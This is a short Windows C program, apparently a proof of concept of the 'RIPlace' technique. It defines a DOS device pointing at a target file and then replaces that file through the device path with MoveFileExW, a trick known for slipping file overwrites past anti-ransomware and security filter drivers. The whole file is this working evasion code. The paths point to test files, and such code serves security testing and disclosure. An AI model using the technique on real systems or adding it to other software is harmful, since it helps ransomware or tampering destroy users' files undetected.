#include <windows.h>

const wchar_t *dosdevName = L"RIPlace";

void Cleanup() {
	DefineDosDeviceW(DDD_REMOVE_DEFINITION, dosdevName, 0);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	const wchar_t *dummyFilePath = LR"(C:\test\dummyfile.txt)";
	const wchar_t *targetFilePath = LR"(\??\C:\test\target.txt)"; // make sure to create it beforehand
	const wchar_t *dosdevPath = LR"(\??\RIPlace)";
	
	HANDLE hDummy = CreateFileW(dummyFilePath, GENERIC_WRITE, 0, 0, CREATE_NEW, 0, 0); // change CREATE_NEW to CREATE_ALWAYS if you live on the edge
	if (hDummy == INVALID_HANDLE_VALUE) {
		return GetLastError();
	}

	CloseHandle(hDummy);
	Cleanup(); // just in case
	
	if (!DefineDosDeviceW(DDD_RAW_TARGET_PATH, dosdevName, targetFilePath)) {
		return GetLastError();
	}

	if (!MoveFileExW(dummyFilePath, dosdevPath, MOVEFILE_REPLACE_EXISTING)) { // change dosdevPath to targetFilePath to remove sorcery
		Cleanup();
		return GetLastError();
	}
	
	Cleanup(); // happy happy joy joy
}
